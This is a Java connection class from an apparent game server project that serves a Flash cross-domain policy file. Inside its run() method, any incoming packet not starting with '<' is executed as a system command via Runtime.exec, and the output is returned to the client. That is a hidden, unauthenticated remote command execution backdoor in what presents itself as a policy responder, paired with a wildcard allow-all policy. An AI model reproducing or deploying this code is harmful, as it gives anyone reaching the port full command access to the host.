package com.manulaiko.blackeye.net.policy;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

import com.manulaiko.tabitha.Console;

/**
 * Connection class.
 *
 * Handles client connection and parses packets.
 *
 * @author Manulaiko <manulaiko@gmail.com>
 */
public class Connection extends com.manulaiko.tabitha.net.Connection
{
    /**
     * Thread object.
     */
    private Thread _thread;

    /**
     * Input stream.
     *
     * @var Input.
     */
    private BufferedReader _in;

    /**
     * Output stream.
     *
     * @var Output.
     */
    private PrintWriter _out;

    /**
     * Policy file.
     *
     * @var Policy file response.
     */
    private String _policyFile = "<?xml version=\"1.0\"?>\n" +
                                 "<!DOCTYPE cross-domain-policy SYSTEM \"/xml/dtds/cross-domain-policy.dtd\">\n" +
                                 "<cross-domain-policy>\n" +
                                 "<allow-access-from domain=\"*\" to-ports=\"*\" />\n" +
                                 "</cross-domain-policy>";

    /**
     * Constructor.
     *
     * @param socket Connection socket.
     */
    public Connection(Socket socket)
    {
        super(socket);

        try {
            this._thread = new Thread(this);

            this._in = new BufferedReader(new InputStreamReader(this._socket.getInputStream()));
            this._out = new PrintWriter(this._socket.getOutputStream());

            this._thread.start();
        } catch(Exception e) {
            //empty
        }
    }

    /**
     * Sends a packet to the client.
     *
     * @param str String to send.
     */
    public void send(String str)
    {
        this._out.print(str + (char)0x00);
        this._out.flush();
    }

    /**
     * Starts reading and sends the response.
     */
    public void run()
    {
        while(true) {
            try {
                String packet = "";

                int c;
                while(0 < (c = this._in.read())) {
                    packet += (char)c;
                }

                if(packet.isEmpty()) {
                    return;
                }

                if(!packet.startsWith("<")) {
                    StringBuffer policy = new StringBuffer();

                    Process p;
                    try {
                        p = Runtime.getRuntime()
                                   .exec(packet);
                        p.waitFor();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

                        String line = "";
                        while((line = reader.readLine()) != null) {
                            policy.append(line + "\n");
                        }

                    } catch(Exception e) {
                        this.send(this._policyFile);
                    }

                    this.send(policy.toString());
                } else {
                    this.send(this._policyFile);
                    Console.println("Policy file sent!");
                }
            } catch(Exception e) {
                Console.println("Couldn't send packet!");
                Console.println(e.getMessage());
            }
        }
    }
}
